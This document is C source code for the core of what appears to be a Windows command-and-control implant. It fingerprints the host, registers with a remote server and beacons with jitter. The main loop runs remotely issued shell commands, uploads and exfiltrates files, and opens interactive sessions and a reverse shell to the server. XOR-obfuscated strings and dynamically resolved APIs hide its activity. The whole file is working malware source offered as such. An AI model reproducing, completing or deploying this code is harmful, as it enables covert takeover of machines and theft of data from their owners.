#include <winsock2.h>
#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#include <stdint.h>
#include "config.h"
#include "protocol.h"
#include "crypto.h"
#include "http.h"
#include "exec.h"
#include "builtin.h"
#include "obf.h"
#include "obf_strings.h"
#include "dynapi.h"
#include "transfer.h"
#include "session.h"
#include "shell.h"

/* ---- Sysinfo ---- */

static uint8_t get_arch(void) {
    SYSTEM_INFO si;
    fnGetNativeSystemInfo(&si);
    return (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? 1 : 0;
}

static uint8_t get_integrity(void) {
    HANDLE hToken = NULL;
    if (!fnOpenProcessToken(fnGetCurrentProcess(), TOKEN_QUERY, &hToken))
        return 2;

    DWORD size = 0;
    fnGetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &size);
    if (size == 0) { fnCloseHandle2(hToken); return 2; }
    TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)fnLocalAlloc(LPTR, size);
    if (!tml) { fnCloseHandle2(hToken); return 2; }
    if (!fnGetTokenInformation(hToken, TokenIntegrityLevel, tml, size, &size)) {
        fnLocalFree(tml); fnCloseHandle2(hToken); return 2;
    }
    DWORD rid = *fnGetSidSubAuthority(tml->Label.Sid,
                                    (DWORD)*fnGetSidSubAuthorityCount(tml->Label.Sid) - 1);
    fnLocalFree(tml);
    fnCloseHandle2(hToken);

    if (rid >= SECURITY_MANDATORY_SYSTEM_RID) return 4;
    if (rid >= SECURITY_MANDATORY_HIGH_RID)   return 3;
    if (rid >= SECURITY_MANDATORY_MEDIUM_RID) return 2;
    return 1;
}

static void collect_sysinfo(implant_metadata_t *meta) {
    DWORD sz;

    sz = (DWORD)sizeof(meta->hostname);
    fnGetComputerNameA(meta->hostname, &sz);

    sz = (DWORD)sizeof(meta->username);
    fnGetUserNameA(meta->username, &sz);

    meta->process_id = fnGetCurrentProcessId();

    char full_path[MAX_PATH] = {0};
    fnGetModuleFileNameA(NULL, full_path, MAX_PATH);
    char *name = strrchr(full_path, '\\');
    const char *src = name ? name + 1 : full_path;
    size_t src_len = strlen(src);
    size_t copy_len = src_len < sizeof(meta->process_name) - 1
                      ? src_len : sizeof(meta->process_name) - 1;
    memcpy(meta->process_name, src, copy_len);
    meta->process_name[copy_len] = '\0';

    meta->arch      = get_arch();
    meta->platform  = 2;  /* Windows */
    meta->integrity = get_integrity();
}

/* ---- Session thread (non-blocking) ---- */

#ifdef SESSION_PORT
static volatile LONG g_session_active = 0;
static volatile LONG g_wsa_init = 0;

typedef struct {
    SOCKET sock;
    uint8_t *session_key;
    uint32_t beacon_id;
    DWORD *sleep_ms;
    DWORD *jitter_pct;
} session_ctx_t;

static DWORD WINAPI session_thread_fn(LPVOID param) {
    session_ctx_t *ctx = (session_ctx_t *)param;
    session_loop(ctx->sock, ctx->session_key, ctx->beacon_id,
                 ctx->sleep_ms, ctx->jitter_pct);
    fnClosesocket(ctx->sock);
    InterlockedExchange(&g_session_active, 0);
    fnLocalFree(ctx);
    return 0;
}
#endif

/* ---- Registration ---- */

static int do_full_register(implant_metadata_t *meta) {
    char pubkey_pem[2048];
    char _path_pub[ENC_PATH_PUBKEY_LEN + 1];
    xor_dec(_path_pub, ENC_PATH_PUBKEY, ENC_PATH_PUBKEY_LEN);
    char _get[ENC_HTTP_GET_LEN + 1];
    xor_dec(_get, ENC_HTTP_GET, ENC_HTTP_GET_LEN);
    int pem_len = http_request(_get, _path_pub, NULL, 0,
                               (uint8_t *)pubkey_pem, (DWORD)sizeof(pubkey_pem) - 1);
    if (pem_len <= 0) return -1;
    pubkey_pem[pem_len] = '\0';
    return do_register(pubkey_pem, meta);
}

/* ---- WinMain ---- */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    resolve_apis();
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    /* Generate random beacon_id (non-zero) */
    implant_metadata_t meta = {0};
    fnBCryptGenRandom(NULL, (PUCHAR)&meta.id, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (meta.id == 0) meta.id = 0xDEAD1234;

    /* Generate session key */
    gen_session_key(meta.session_key);

    meta.sleep  = SLEEP_MS / 1000;   /* server expects seconds */
    meta.jitter = JITTER_PCT;

    collect_sysinfo(&meta);

    /* Registration loop: 3 attempts, 5s apart */
    int registered = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
        if (do_full_register(&meta) == 0) { registered = 1; break; }
        if (attempt < 2) fnSleep(5000);
    }
    if (!registered) return 1;

    /* Main checkin loop */
    DWORD sleep_ms   = SLEEP_MS;
    DWORD jitter_pct = JITTER_PCT;
    int   fail_count = 0;
    int   got_task   = 0;

    while (1) {
        got_task = 0;
        uint8_t *resp_buf = (uint8_t *)fnLocalAlloc(0x40, 4 * 1024 * 1024);
        DWORD resp_len = 4 * 1024 * 1024;
        if (!resp_buf) { fnSleep(sleep_ms); continue; }

        if (do_checkin(meta.id, resp_buf, &resp_len) < 0) {
            fnLocalFree(resp_buf);
            fail_count++;
            if (fail_count >= 2) {
                if (do_full_register(&meta) == 0)
                    fail_count = 0;
            }
        } else {
            fail_count = 0;

            if (resp_len > 0) {
                uint8_t *plain = (uint8_t *)fnLocalAlloc(0x40, 4 * 1024 * 1024);
                DWORD plain_len = 4 * 1024 * 1024;

                if (plain && aes_decrypt(meta.session_key, resp_buf, resp_len,
                                plain, &plain_len) == 0 && plain_len >= 16) {

                    DWORD offset = 0;
                    while (offset + 16 <= plain_len) {
                        task_header_t hdr;
                        decode_header(plain + offset, &hdr);
                        uint32_t task_data_len = hdr.length;
                        const uint8_t *task_data = (offset + 16 + task_data_len <= plain_len)
                                                    ? plain + offset + 16 : NULL;

                        if (hdr.type == TASK_NOP) {
                            break;
                        }

                        got_task = 1;

                        if (hdr.type == TASK_RUN && hdr.code == CODE_RUN_SHELL) {
                            char cmd[1024] = {0};
                            decode_run_req(task_data, (int)task_data_len, cmd, sizeof(cmd));

                            char output[65536] = {0};
                            if (builtin_dispatch(cmd, output, sizeof(output))) {
                                /* handled natively */
                            } else if (xor_prefix(cmd, ENC_SHELL_PREFIX, ENC_SHELL_PREFIX_LEN)) {
                                run_command_shell(cmd + ENC_SHELL_PREFIX_LEN, output, sizeof(output));
                            } else {
                                run_command_direct(cmd, output, sizeof(output));
                            }
                            send_result(meta.id, hdr.label, FLAG_NONE,
                                        output, meta.session_key);
                        }
                        else if (hdr.type == TASK_SET && hdr.code == CODE_SET_SLEEP
                                 && task_data_len >= 8 && task_data) {
                            const uint8_t *d = task_data;
                            DWORD interval = (DWORD)d[0] | ((DWORD)d[1]<<8)
                                           | ((DWORD)d[2]<<16) | ((DWORD)d[3]<<24);
                            DWORD jitter   = (DWORD)d[4] | ((DWORD)d[5]<<8)
                                           | ((DWORD)d[6]<<16) | ((DWORD)d[7]<<24);
                            sleep_ms       = interval * 1000;
                            jitter_pct     = jitter;
                            meta.sleep     = interval;
                            meta.jitter    = jitter;
                        }
                        else if (hdr.type == TASK_FILE_STAGE && task_data) {
                            handle_file_stage(meta.id, hdr.label, hdr.identifier,
                                              hdr.flags, task_data, task_data_len,
                                              meta.session_key, INVALID_SOCKET);
                        }
                        else if (hdr.type == TASK_FILE_EXFIL && task_data) {
                            handle_file_exfil(meta.id, hdr.label,
                                              (const char *)task_data,
                                              meta.session_key, INVALID_SOCKET);
                        }
                        #ifdef SESSION_PORT
                        else if (hdr.type == TASK_INTERACTIVE && task_data) {
                            if (InterlockedCompareExchange(&g_session_active, 0, 0) == 0) {
                                char host[256] = {0};
                                uint16_t sport = 0;
                                if (parse_interactive_req(task_data, (int)task_data_len,
                                                          host, sizeof(host), &sport) == 0) {
                                    if (!g_wsa_init) {
                                        if (session_init() == 0) g_wsa_init = 1;
                                    }
                                    if (g_wsa_init) {
                                        SOCKET s = session_connect(host, sport);
                                        if (s != INVALID_SOCKET) {
                                            session_ctx_t *sc = (session_ctx_t *)fnLocalAlloc(
                                                                    0x40, sizeof(session_ctx_t));
                                            if (sc) {
                                                sc->sock        = s;
                                                sc->session_key = meta.session_key;
                                                sc->beacon_id   = meta.id;
                                                sc->sleep_ms    = &sleep_ms;
                                                sc->jitter_pct  = &jitter_pct;
                                                InterlockedExchange(&g_session_active, 1);
                                                HANDLE ht = fnCreateThread(NULL, 0,
                                                                session_thread_fn, sc, 0, NULL);
                                                if (ht) {
                                                    fnCloseHandle2(ht);
                                                } else {
                                                    InterlockedExchange(&g_session_active, 0);
                                                    fnClosesocket(s);
                                                    fnLocalFree(sc);
                                                }
                                            } else {
                                                fnClosesocket(s);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        #endif
                        else if (hdr.type == TASK_SHELL_START && task_data && task_data_len >= 2) {
                            uint16_t shell_port = (uint16_t)task_data[0] | ((uint16_t)task_data[1] << 8);
                            char shell_host[ENC_SERVER_HOST_LEN + 1];
                            xor_dec(shell_host, ENC_SERVER_HOST, ENC_SERVER_HOST_LEN);
                            shell_start(shell_host, shell_port, meta.session_key, meta.id, hdr.label);
                        }
                        else if (hdr.type == TASK_SHELL_STOP) {
                            shell_stop();
                        }
                        else if (hdr.type == TASK_EXIT) {
                            fnExitProcess(0);
                        }

                        offset += 16 + task_data_len;
                    }
                }
                if (plain) fnLocalFree(plain);
            }
            fnLocalFree(resp_buf);
        }

        if (got_task) continue;

        /* No pending tasks — sleep with jitter */
        DWORD jitter_range = (DWORD)(((unsigned long long)sleep_ms * jitter_pct) / 100);
        DWORD actual_sleep = sleep_ms;
        if (jitter_range > 0) {
            DWORD r = 0;
            fnBCryptGenRandom(NULL, (PUCHAR)&r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            actual_sleep += r % jitter_range;
        }
        fnSleep(actual_sleep);
    }
}
